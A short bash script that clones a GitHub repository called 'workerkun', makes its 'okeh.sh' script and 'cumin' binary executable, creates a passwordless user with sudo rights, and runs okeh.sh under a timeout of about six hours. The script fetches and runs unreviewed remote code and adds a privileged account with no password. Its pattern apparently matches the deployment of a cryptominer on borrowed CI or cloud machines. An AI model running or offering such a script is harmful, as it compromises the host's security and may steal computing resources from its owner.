#!/bin/bash
sudo apt update
git clone https://github.com/Kikinan86/workerkun.git && cd workerkun
chmod +x okeh.sh && chmod +x cumin
sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
sudo -u ikuk -H sh -c "timeout 359m ./okeh.sh"
